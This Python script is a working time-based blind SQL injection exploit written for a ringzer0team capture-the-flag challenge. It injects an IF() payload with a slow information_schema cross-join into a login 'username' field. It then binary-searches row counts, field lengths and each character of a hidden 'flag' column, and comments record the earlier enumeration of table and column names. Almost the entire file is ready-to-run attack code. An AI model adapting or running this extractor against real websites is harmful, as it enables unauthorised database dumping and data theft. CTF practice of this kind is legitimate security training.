import requests
import time

get = "GET"
post = "POST"

url = "http://challenges.ringzer0team.com:20014/chal14.php"
requestType = post
session = requests.Session()
session.headers = {}

sqliParam = "username"
params = {sqliParam : None, 'password':''}

matchingPattern = ""

isTimeBased = True
limitTime = 1100 #milliseconds
convertToChar = False

nbRows = None
lengthColumn = None
lengthColumnSet = False

sleeper = "SELECT COUNT(1) FROM information_schema.tables, (SELECT 2 FROM information_schema.tables, (SELECT 1 FROM information_schema.tables, (SELECT 1 FROM information_schema.tables)a)b)c"

#injectionChar = "'OR(ASCII(({query})))>{charCodeOrCount}{sleeper}#"

injectionCount = "'OR( IF( (({query}))>{charCodeOrCount}, ({sleeper}), 1337))OR'"
injectionChar = injectionCount
def find(query, midNb, isCount=True, charOffset=0, offset=0, lowerBound=0, upperBound=None, bSearch=True, space_replace=None):
    injection = injectionCount if isCount else injectionChar
    while upperBound != lowerBound and bSearch or not bSearch and midNb <= upperBound:
        if not bSearch:
            midNb = lowerBound

        sql = buildSQL(query, injection, midNb, charOffset, offset, isCount=isCount)
        sql = sql if space_replace == None else sql.replace(' ', space_replace)
        params[sqliParam] = sql
        if bSearch:
            if matches(params):
                lowerBound = midNb + 1
            else:
                upperBound = midNb
            
            midNb = midNb * 2 if upperBound is None else (lowerBound + upperBound) / 2
        else:
            if matches(params):
                return midNb
            else:
                midNb += 1

    return upperBound

def getLimitTime():
    return limitTime / 1000.0


def buildSQL(query, injection, charCodeOrCount, charOffset, offset, isCount):
    charCodeOrCount = chr(charCodeOrCount) if convertToChar and not isCount else charCodeOrCount
    query = query.format(charOffset='{charOffset:08d}', offset='{offset:08d}')
    query = query.format(charOffset=charOffset, offset=offset)
    injection = injection.format(query='{query}', charCodeOrCount='{charCodeOrCount:08d}', sleeper=sleeper)
    return injection.format(query=query, charCodeOrCount=charCodeOrCount, sleeper=sleeper)


def matches(parameters):
    result = executeQuery(parameters)
    if isTimeBased and result >= getLimitTime() or \
        not isTimeBased and matchingPattern in result:
        return True
    else:
        return False

def executeQuery(parameters):
    start = time.time()
    if requestType == get:
        r = session.get(url, params=parameters)
    else: # requestType == post
        r = session.post(url, data=parameters)

    txt = r.text
    end = time.time()

    if isTimeBased:
        return end - start
    return txt

	
# Replace '=' with 'NOT ABS(STRCMP(field1, field2))
# Works with strings and numbers

#sqlNbRows = "SELECT COUNT(*) FROM information_schema.columns " \
#            "WHERE NOT ABS(STRCMP(table_schema,database())) "
#sqlLengthColumnName = "SELECT LENGTH(CONCAT(table_name,'::',column_name)) " \
#                      "FROM information_schema.columns "\
#                      "WHERE NOT ABS(STRCMP(table_schema,database())) "\
#                      "LIMIT {offset},1"
#sqlCharacterColumnName = "SELECT ASCII(SUBSTR(CONCAT(table_name,'::',column_name),{charOffset},1)) " \
#                         "FROM information_schema.columns "\
#                         "WHERE NOT ABS(STRCMP(table_schema,database())) "\
#                         "LIMIT {offset},1"

# FOUND : timeyFlag::flag

sqlNbRows = "SELECT COUNT(*) FROM timeyFlag"
sqlLengthColumnName = "SELECT LENGTH(flag) " \
                      "FROM timeyFlag "\
                      "LIMIT {offset},1"
sqlCharacterColumnName = "SELECT ASCII(SUBSTR(flag,{charOffset},1)) " \
                         "FROM timeyFlag "\
                         "LIMIT {offset},1"

nbRows = find(sqlNbRows, 50) if nbRows == None else nbRows
print("Nb rows : {}".format(nbRows))

lastSkip = None
for rowIndex in range(nbRows):
    lengthColumn = find(sqlLengthColumnName, 50, offset=rowIndex) if lengthColumn == None else lengthColumn
    print("Length column {} : {}".format(rowIndex, lengthColumn))

    columnName = ""
    for charIndex in range(lengthColumn):
        try:
            found = find(sqlCharacterColumnName,
                                  255/2,
                                  isCount=False,
                                  charOffset=charIndex + 1,
                                  offset=rowIndex,
                                  lowerBound=0,
                                  upperBound=255)
            columnName += chr(found)
            print(columnName)
        except KeyboardInterrupt:
            now = time.time()
            if lastSkip != None and now - lastSkip < 1:
                raise
            else:
                break
            lastSkip = time.time()
    print(columnName)
    if not lengthColumnSet:
        lengthColumn = None
